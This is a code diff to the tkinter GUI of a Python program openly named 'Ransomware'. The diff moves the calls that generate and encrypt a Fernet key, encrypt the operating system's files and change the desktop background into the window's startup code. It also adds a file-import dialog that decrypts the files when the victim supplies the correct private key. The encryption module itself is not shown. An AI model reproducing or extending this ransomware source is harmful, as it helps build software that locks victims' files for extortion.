@@ -1,4 +1,4 @@
-from tkinter import font
+from tkinter import font, filedialog, messagebox
 from tkinter.constants import BOTTOM, END, LEFT
 from typing import Sized
 import ransomware
@@ -11,6 +11,13 @@ import os
 class Application:
     def __init__(self, master):
         self.master = master
+        
+        self.malware = ransomware.Ransomware()
+        self.malware.create_fernet_key()
+        self.malware.encrypt_fernet_key()
+        self.malware.encrypt_os()
+        self.malware.update_background()
+
         master.geometry('900x650')
         master.title('Ransomware')
         master.configure(bg='darkred')
@@ -36,30 +43,39 @@ class Application:
         
         self.bottom_frame = tk.Frame(master, bg='purple')
         self.bottom_frame.pack(side=BOTTOM)
-        self.bottom_lbl = tk.Label(self.bottom_frame, text='Enter decryption key:')
+        self.bottom_lbl = tk.Label(self.bottom_frame, text='Import Decryption key:')
         self.bottom_lbl.pack(side=LEFT)
-        self.bottom_entry = tk.Entry(self.bottom_frame, width='50', font='ubuntu 15')
-        self.bottom_entry.pack(side=LEFT)
-        self.bottom_btn = tk.Button(self.bottom_frame, text='Decrypt\nFiles', command=self.button)
+        #self.bottom_entry = tk.Entry(self.bottom_frame, width='50', font='ubuntu 15')
+        #self.bottom_entry.pack(side=LEFT)
+        self.bottom_btn = tk.Button(self.bottom_frame, text='Decrypt\nFiles', command=self.uploadAction)
         self.bottom_btn.pack(side=LEFT)
 
-    def button(self):
-        decrypt_key = self.bottom_entry.get()
-        self.bottom_entry.delete(0, END)
+
+    def uploadAction(self, event=None):
+        filename = filedialog.askopenfilename()
+        print(filename)
+        if self.malware.decrypt_fernet_key(filename):
+            messagebox.showinfo("Success!", "Your files have been decrypted!")
+            self.malware.decrypt_os()
+        else:
+            messagebox.showerror("Failed!", "You have imported the wrong private key.")
+            
+
+
 
 
 
 def main():
-    malware = ransomware.Ransomware()
-    malware.create_fernet_key()
-    malware.encrypt_fernet_key()
-    malware.encrypt_os()
-    malware.update_background()
+    #malware = ransomware.Ransomware()
+    #malware.create_fernet_key()
+    #malware.encrypt_fernet_key()
+    #malware.encrypt_os()
+    #malware.update_background()
     root = tk.Tk()
     app = Application(master=root)
     root.mainloop()
 
 if __name__ == '__main__':
-    if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
-        os.chdir(sys._MEIPASS)
+#    if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
+#        os.chdir(sys._MEIPASS)
     main()
